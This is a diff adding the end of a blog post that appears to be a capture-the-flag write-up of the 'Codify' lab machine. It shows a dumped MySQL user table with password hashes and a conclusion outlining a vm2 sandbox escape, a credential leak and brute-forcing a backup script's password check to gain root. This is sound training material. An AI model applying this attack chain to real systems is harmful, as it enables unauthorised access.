+</span></span><span class="line"><span class="cl"><span class="p">|</span> localhost <span class="p">|</span> root        <span class="p">|</span> *4ECCEBD05161B6782081E970D9D2C72138197218 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> 127.0.0.1 <span class="p">|</span> root        <span class="p">|</span> *4ECCEBD05161B6782081E970D9D2C72138197218 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> %         <span class="p">|</span> passbolt    <span class="p">|</span> *63DA7233CC5151B814CBEC5AF8B3EAC43347A203 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> %         <span class="p">|</span> joshua      <span class="p">|</span> *323A5EDCBFA127CC75F6C155457533AC1D5C4921 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> %         <span class="p">|</span> root        <span class="p">|</span> *4ECCEBD05161B6782081E970D9D2C72138197218 <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+-----------+-------------+-------------------------------------------+
+</span></span><span class="line"><span class="cl"><span class="m">6</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+</span></span></code></pre></div><p>There is a password hash for root, but I didn&rsquo;t manage to crack it this time. After some headaches, I realised that I never tried to log in as root using the password that I discovered with the python script. I put in the password for root and voilà, the machine is rooted.</p>
+<p><img src="8.png" alt="image"></p>
+<h2 id="conclusion">
+  Conclusion
+  <a class="heading-link" href="#conclusion">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>The codify machine is a good learning experience, demonstrating techniques like sandbox escape, password cracking, script analysis, brute forcing, and chaining multiple privilege escalation vectors.</p>
+<p>Initial access was gained via escaping the vulnerable vm2 sandbox, using the netcat utility. Further enumeration revealed a information leakeage, leading to the compromise of the Joshua user.</p>
+<p>The pivotal pivoting was accomplished analyzing the MySQL database backup script, whose weak password comparison logic made it possible to brute-force the admin password, gaining complete control of the system.</p>
+<p>This box exemplifies the importance of thinking broadly across multiple domains like web apps, databases, scripts, authentication, and system administration, to make sure that all layers in the system are properly secured.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2023 -
+    
+    2024
+     Dennis Drebitca 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
